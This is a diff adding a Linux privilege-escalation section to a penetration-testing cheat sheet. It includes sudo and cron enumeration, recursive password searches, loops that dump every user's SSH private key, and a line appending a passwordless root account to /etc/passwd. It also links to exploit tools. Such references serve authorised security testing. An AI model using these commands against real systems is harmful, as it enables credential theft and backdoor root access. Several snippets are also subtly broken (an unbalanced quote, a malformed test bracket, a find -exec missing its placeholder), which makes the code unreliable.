@@ -309,8 +309,111 @@ PS C:\> Find-AllVulns
 - https://github.com/abatchy17/WindowsExploits
 
 # Linux Priv Esc
+- https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
 ## Enumeration
+### User and system details
+```bash
+#7.Escalation Path Sudo - see what commands can be run by current user (as root) that do not require password
+sudo -l
 
+#find out commands that usually require the sudo command can be run without sudo
+cat /etc/sudoers
+
+#if any user that belongs to the group wheel can execute anything as sudo, to become root
+sudo su
+
+#check linux system details
+cat /etc/*release*
+uname -a
+rpm -q kernel
+dmesg | grep -i linux
+
+#writable folders in linux (doesnt mean executable)
+/tmp
+/dev/shm
+
+#services currently run by root
+ps aux|grep root
+ps -ef|grep root
+
+#installed app
+ls -lah /usr/bin/
+ls -lah /sbin/
+dpkg -l
+rpm -qa
+ls -lah /var/cache/apt/archives
+ls -lah /var/cache/yum/
+
+#scheduled task
+crontab -l
+ls -la /etc/cron*
+ls -lah /var/spool/cron
+ls -la /etc/|grep cron
+cat /etc/crontab
+cat /etc/anacrontab
+
+#finding password in files
+grep -rnw '/etc/passwd' -e 'root'
+
+#finding the word "password" in files
+grep -R 'password' config.php
+find / -type f -exec grep -H 'password' \; 2>/dev/null
+grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name " *. php" -print0 | xargs -0 grep -i -n "var $password"
+```
+### Linux SSH
+- private key = id_rsa ,id_dsa (SSH2 only)
+- public key = id_rsa.pub, id_dsa.pub (SSH2 only)
+```bash
+#find id_rsa using bash script
+#!/bin/bash
+for X in $(cut -f6 -d:' /etc/passwd |sort |uniq); do
+  if [-s "${X}/.ssh/id_rsa" ]; then
+    echo "### ${X}: "
+    cat "${X}/.ssh/id_rsa"
+    echo ""
+  fi
+done
+
+#find id_dsa using bash script
+#!/bin/bash
+for X in $(cut -f6 -d':' /etc/passwd |sort |uniq); do
+  if [-s "${X}/.ssh/id_dsa" ]; then
+    echo "### ${X}: "
+    cat "${X}/.ssh/id_dsa"
+    echo
+  fi
+done
+```
+### Find SGID SUID GUID bit
+```bash
+find / -perm -1000 -type d 2>/dev/null
+
+SGID (chmod 2000):
+find / -perm -g=s -type f 2>/dev/null
+
+#SUID (chmod 4000) :
+find / -perm -u=s -type f 2>/dev/null
+find /* -user root -perm -4000 -print 2>/dev/null
+
+#SUID or GUID
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
+
+#Add user to /etc/passwd and root group
+echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
+```
+
+### Use LinPEAS and LinEnum and Linprivchecker
+- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+- https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
+
+### Linux Exploits DB
+- https://github.com/SecWiki/linux-kernel-exploits
+- https://github.com/xairy/linux-kernel-exploitation
 
 # Active Directory Pentesting
 ## Enumeration
